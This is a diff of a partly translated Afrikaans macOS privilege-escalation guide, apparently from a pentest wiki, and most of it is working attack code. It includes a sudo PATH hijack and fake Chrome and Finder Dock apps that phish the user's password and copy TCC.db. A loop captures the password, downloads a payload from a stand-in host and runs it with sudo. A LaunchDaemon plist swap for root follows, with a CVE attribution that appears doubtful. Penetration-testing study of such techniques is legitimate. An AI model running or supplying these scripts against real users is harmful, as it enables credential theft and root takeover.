@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-As jy hierheen gekom het op soek na TCC Privilege Escalation, gaan na:
+As jy hierheen gekom het op soek na TCC privilege escalation, gaan na:
 
 
 {{#ref}}
@@ -13,45 +13,48 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Neem asseblief kennis dat **die meeste truuks oor privilege escalation wat Linux/Unix raak, ook op MacOS-masjiene van toepassing sal wees**. Sien:
+Neem asseblief kennis dat **die meeste truuks oor privilege escalation wat Linux/Unix raak, ook MacOS** masjiene sal beïnvloed. Sien:
 
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## Gebruikerinteraksie
+## Gebruikersinteraksie
 
 ### Sudo Hijacking
 
-Jy kan die oorspronklike [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) vind.
+You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Echter, macOS **onderhou** die gebruiker se **`PATH`** wanneer hy **`sudo`** uitvoer. Dit beteken dat 'n ander manier om hierdie aanval te bewerkstellig sou wees om **hijack other binaries** wat die slagoffer steeds sal uitvoer wanneer hy **running sudo:**
+Tog **handhaaf** macOS die gebruiker se **`PATH`** wanneer hy **`sudo`** uitvoer. Dit beteken dat 'n ander manier om hierdie aanval te bereik sou wees om **hijack other binaries** wat die slagoffer sal uitvoer wanneer hy **running sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
-cat > /opt/homebrew/bin/ls <<EOF
+cat > /opt/homebrew/bin/ls <<'EOF'
 #!/bin/bash
-if [ "\$(id -u)" -eq 0 ]; then
+if [ "$(id -u)" -eq 0 ]; then
 whoami > /tmp/privesc
 fi
-/bin/ls "\$@"
+/bin/ls "$@"
 EOF
 chmod +x /opt/homebrew/bin/ls
 
 # victim
 sudo ls
 ```
-Let daarop dat 'n gebruiker wat die terminal gebruik waarskynlik **Homebrew geïnstalleer** het. Dus is dit moontlik om binaries in **`/opt/homebrew/bin`** te kaap.
+Let daarop dat 'n gebruiker wat die terminal gebruik waarskynlik **Homebrew geïnstalleer** het. Dit maak dit moontlik om uitvoerbare lêers in **`/opt/homebrew/bin`** te kap.
 
 ### Dock Impersonation
 
-Deur sekere **social engineering** te gebruik kan jy **byvoorbeeld Google Chrome naboots** binne die Dock en eintlik jou eie script uitvoer:
+Deur 'n bietjie **social engineering** te gebruik, kan jy byvoorbeeld **Google Chrome** binne die Dock naboots en eintlik jou eie skrip uitvoer:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-Voorstelle:
+Sommige voorstelle:
 
-- Kyk in die Dock of daar 'n Chrome is, en in daardie geval **verwyder** daardie inskrywing en **voeg** die **valse** **Chrome-inskrywing op dieselfde posisie** in die Dock array.
+- Kyk in die Dock of daar 'n Chrome is, en in daardie geval **verwyder** daardie inskrywing en **voeg** die **vals** **Chrome-inskrywing op dieselfde posisie** in die Dock-array by.
+
+<details>
+<summary>Chrome Dock impersonation script</summary>
 ```bash
 #!/bin/sh
 
@@ -65,7 +68,7 @@ mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
 mkdir -p /tmp/Google\ Chrome.app/Contents/Resources
 
 # Payload to execute
-cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
+cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -74,8 +77,8 @@ int main() {
 char *cmd = "open /Applications/Google\\\\ Chrome.app & "
 "sleep 2; "
 "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
-"echo \$PASSWORD > /tmp/passwd.txt";
+"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo $PASSWORD > /tmp/passwd.txt";
 system(cmd);
 return 0;
 }
@@ -87,7 +90,7 @@ rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c
 chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
 
 # Info.plist
-cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
+cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -121,16 +124,21 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
+</details>
+
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
 Voorstelle:
 
-- Jy **kan nie Finder uit die Dock verwyder nie**, so as jy dit by die Dock gaan voeg, kan jy die vals Finder net langs die regte een plaas. Hiervoor moet jy **voeg die vals Finder-inskrywing aan die begin van die Dock-array by**.
-- Nog 'n opsie is om dit nie in die Dock te plaas nie en dit net oop te maak, "Finder asking to control Finder" is nie so vreemd nie.
-- Nog 'n opsie om **op te skaal na root sonder om die wagwoord in 'n afskuwelike dialoog te vra**, is om Finder regtig te laat vra vir die wagwoord om 'n geprivilegieerde aksie uit te voer:
-- Vra Finder om na **`/etc/pam.d`** 'n nuwe **`sudo`** lêer te kopieer (Die prompt wat vir die wagwoord vra sal aandui dat "Finder wants to copy sudo")
-- Vra Finder om 'n nuwe **Authorization Plugin** te kopieer (Jy kan die lêernaam beheer sodat die prompt wat om die wagwoord vra, aandui dat "Finder wants to copy Finder.bundle")
+- Jy **kan nie Finder uit die Dock verwyder nie**, dus as jy dit by die Dock gaan voeg, kan jy die vals Finder net langs die regte een sit. Hiervoor moet jy **die vals Finder-inskrywing aan die begin van die Dock array voeg**.
+- 'n Ander opsie is om dit nie in die Dock te plaas nie en dit net oop te maak; "Finder asking to control Finder" is nie so vreemd nie.
+- Nog 'n opsie om **escalate to root without asking** die wagwoord met 'n lelike dialoog te omseil, is om Finder werklik die wagwoord te laat vra om 'n bevoorregte aksie uit te voer:
+- Vra Finder om 'n nuwe **`sudo`** lêer na **`/etc/pam.d`** te kopieer (die prompt wat om die wagwoord vra sal aandui dat "Finder wants to copy sudo")
+- Vra Finder om 'n nuwe **Authorization Plugin** te kopieer (Jy kan die lêernaam beheer sodat die prompt wat om die wagwoord vra aandui dat "Finder wants to copy Finder.bundle")
+
+<details>
+<summary>Finder Dock impersonation script</summary>
 ```bash
 #!/bin/sh
 
@@ -144,7 +152,7 @@ mkdir -p /tmp/Finder.app/Contents/MacOS
 mkdir -p /tmp/Finder.app/Contents/Resources
 
 # Payload to execute
-cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
+cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -153,8 +161,8 @@ int main() {
 char *cmd = "open /System/Library/CoreServices/Finder.app & "
 "sleep 2; "
 "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
-"echo \$PASSWORD > /tmp/passwd.txt";
+"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo $PASSWORD > /tmp/passwd.txt";
 system(cmd);
 return 0;
 }
@@ -166,7 +174,7 @@ rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c
 chmod +x /tmp/Finder.app/Contents/MacOS/Finder
 
 # Info.plist
-cat << EOF > /tmp/Finder.app/Contents/Info.plist
+cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -200,18 +208,20 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
+</details>
+
 {{#endtab}}
 {{#endtabs}}
 
-### Wagwoordprompt phishing + sudo hergebruik
+### Wagwoordprompt phishing + sudo reuse
 
-Malware misbruik gereeld gebruikersinteraksie om **vasvang 'n sudo-vaardige wagwoord** en dit programmaties te hergebruik. 'n Algemene vloei:
+Malware misbruik dikwels gebruikersinteraksie om **ʼn sudo-geskikte wagwoord vas te vang** en dit programmaties weer te gebruik. ʼn Algemene vloei:
 
-1. Bepaal die aangemelde gebruiker met `whoami`.
-2. **Herhaal die wagwoord-prompts** totdat `dscl . -authonly "$user" "$pw"` sukses teruggee.
-3. Berg die inlogbewys (bv., `/tmp/.pass`) in kas en voer bevoorregte aksies uit met `sudo -S` (wagwoord oor stdin).
+1. Identifiseer die aangemelde gebruiker met `whoami`.
+2. **Herhaal wagwoordversoeke** totdat `dscl . -authonly "$user" "$pw"` suksesvol terugkeer.
+3. Kas die inlogbewyse (bv., `/tmp/.pass`) en voer geprivilegieerde aksies uit met `sudo -S` (wagwoord oor stdin).
 
-Voorbeeld van 'n minimale ketting:
+Voorbeeld minimale ketting:
 ```bash
 user=$(whoami)
 while true; do
@@ -222,14 +232,77 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-Die gesteelde wagwoord kan dan hergebruik word om **Gatekeeper quarantine skoon te maak met `xattr -c`**, LaunchDaemons of ander geprivilegieerde lêers te kopieer, en addisionele fases nie-interaktief uit te voer.
+Die gesteelde wagwoord kan dan hergebruik word om **Gatekeeper-quarantaine skoon te maak met `xattr -c`**, LaunchDaemons of ander geprivilegieerde lêers te kopieer, en verdere fases nie-interaktief uit te voer.
+
+## Nuwer macOS-spesifieke vektore (2023–2025)
+
+### Verouderde `AuthorizationExecuteWithPrivileges` nog steeds bruikbaar
+
+`AuthorizationExecuteWithPrivileges` was deprecated in 10.7 but **still works on Sonoma/Sequoia**. Baie kommersiële updaters roep `/usr/libexec/security_authtrampoline` aan met 'n onbetroubare pad. As die teiken-binarie deur die gebruiker skryfbaar is, kan jy 'n trojan plant en die legitieme prompt misbruik:
+```bash
+# find vulnerable helper calls
+log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
+
+# replace expected helper
+cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
+chmod +x /Users/me/Library/Application\ Support/Target/helper
+# when the app updates, the root prompt spawns your payload
+```
+Kombineer dit met die **masquerading tricks above** om 'n geloofwaardige wagwoord-dialoog te wys.
+
+### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
+
+As 'n LaunchDaemon plist of sy `ProgramArguments`-teiken **user-writable** is, kan jy escalate deur dit te verwissel en dan launchd te dwing om te herlaai:
+```bash
+sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
+cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
+chmod 755 /Library/PrivilegedHelperTools/securemonitor
+cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+<key>Label</key><string>com.apple.securemonitor</string>
+<key>ProgramArguments</key>
+<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
+<key>RunAtLoad</key><true/>
+</dict></plist>
+PLIST
+sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
+```
+Dit weerspieël die exploit-patroon wat gepubliseer is vir **CVE-2025-24085**, waar 'n writable plist misbruik is om aanvallerkode as root uit te voer.
+
+### XNU SMR credential race (CVE-2025-24118)
+
+'n **race in `kauth_cred_proc_update`** laat 'n plaaslike aanvaller toe om die lees-slegs credential-aanwyser (`proc_ro.p_ucred`) te korrupteer deur `setgid()`/`getgid()`-lusse oor drade te wedloop totdat 'n geskeurde `memcpy` voorkom. Suksesvolle korrupsie gee **uid 0** en toegang tot kernel-geheue. Minimale PoC-struktuur:
+```c
+// thread A
+while (1) setgid(rand());
+// thread B
+while (1) getgid();
+```
+Kombineer dit met heap grooming om beheerde data te plaas waar die pointer weer gelees word. Op kwesbare builds is dit 'n betroubare **local kernel privesc** sonder SIP-bypass vereistes.
+
+### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)
+
+As jy reeds root het, blokkeer SIP steeds skryfaksies na stelsel-ligginge. Die **Migraine** bug misbruik die Migration Assistant entitlement `com.apple.rootless.install.heritable` om 'n child process te spawn wat SIP-bypass erflik erf en beskermde paaie (bv. `/System/Library/LaunchDaemons`) oorskryf. Die ketting:
+
+1. Kry root op 'n lewendige stelsel.
+2. Trigger `systemmigrationd` met 'n gemanipuleerde staat om 'n deur die aanvaller beheerde binary uit te voer.
+3. Gebruik die geërfde entitlement om SIP-beskermde lêers te patch, wat selfs ná 'n herbegin voortbestaan.
+
+### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
+
+Meerdere Apple daemons aanvaar **NSPredicate** objects oor XPC en valideer slegs die `expressionType`-veld, wat deur die aanvaller beheer word. Deur 'n predicate te konstrueer wat arbitrêre selectors evalueer, kan jy **code execution in root/system XPC services** bereik (bv. `coreduetd`, `contextstored`). Wanneer dit gekombineer word met 'n aanvanklike app sandbox escape, verleen dit **privilege escalation without user prompts**. Soek XPC-endpunte wat predicates deserialiseer en 'n robuuste visitor ontbreek.
 
 ## TCC - Root Privilege Escalation
 
 ### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
 
-**Enige gebruiker** (selfs ongemagtigde gebruikers) kan 'n time machine snapshot skep en mount en **kry toegang tot AL die lêers** van daardie snapshot.\
-Die **enige bevoegdheid** wat nodig is, is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (FDA) toegang (`kTCCServiceSystemPolicyAllfiles`) moet hê, wat deur 'n admin toegeken moet word.
+**Enige gebruiker** (selfs onprivilegieerde gebruikers) kan 'n Time Machine snapshot skep en mount en **TOEGANG kry TOT AL die lêers** van daardie snapshot.  
+Die **enigste voorwaarde** is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (FDA) toegang (`kTCCServiceSystemPolicyAllfiles`) het, wat deur 'n admin verleen moet word.
+
+<details>
+<summary>Koppel Time Machine-snapshot</summary>
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -249,11 +322,13 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-'n Meer gedetailleerde verduideliking kan [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+</details>
 
-## Gevoelige Inligting
+'n Meer gedetailleerde verduideliking kan gevind word in die [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-Dit kan nuttig wees om voorregte te verhoog:
+## Sensitiewe Inligting
+
+Dit kan nuttig wees om bevoegdhede te verhoog:
 
 
 {{#ref}}
@@ -262,6 +337,7 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 ## Verwysings
 
-- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
 
 {{#include ../../banners/hacktricks-training.md}}
